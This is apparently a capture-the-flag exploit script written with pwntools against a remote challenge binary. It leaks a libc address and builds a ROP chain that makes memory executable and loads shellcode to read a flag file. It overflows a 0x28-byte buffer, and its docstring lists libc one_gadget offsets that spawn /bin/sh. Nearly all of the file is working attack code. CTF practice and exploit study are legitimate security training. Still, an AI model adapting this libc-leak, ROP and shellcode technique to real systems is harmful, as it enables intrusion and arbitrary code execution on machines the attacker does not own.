#!/usr/bin/env python3
"""
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
"""

from pwn import *

from pwnlib.rop.gadgets import Gadget

exe = ELF("program/chall_patched")
libc = ELF("program/libc.so.6")
ld = ELF("program/ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13371
#HOST = "127.0.0.1"
#PORT = 1024

gdbscript = '''
b *vuln+95
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

r.recvuntil(b'it\'s at')

system_addr = int(r.recvline().strip(), 16)
libc_base = system_addr - libc.symbols['system']

libc.address = libc_base


shellcode_insns = [
    shellcraft.amd64.mov('rdi', 1),
    shellcraft.amd64.linux.readfile('/app/flag.txt'),
    shellcraft.exit(0),
]

shellcode = b''.join(asm(i) for i in shellcode_insns)

ropper = ROP(libc, badchars=b'\x0a')

shellcode_addr = libc_base

ropper.rdi = shellcode_addr
ropper.rdx = 7
ropper.rax = 9
ropper.rsi = 0x1000

ropper.raw(libc_base + 0x00000000000d8340) # add rax, 1 ; ret
ropper.raw(ropper.find_gadget(["syscall", "ret"]).address)


ropper.read(0, shellcode_addr, len(shellcode))

ropper.raw(shellcode_addr)
print(ropper.dump())

gadget_addr = libc_base + 0xebce2
print(hex(libc_base))

assert b'\x0a' not in ropper.chain()

r.sendline(b'A'*0x28 + ropper.chain())
r.sendline(shellcode)
r.interactive()
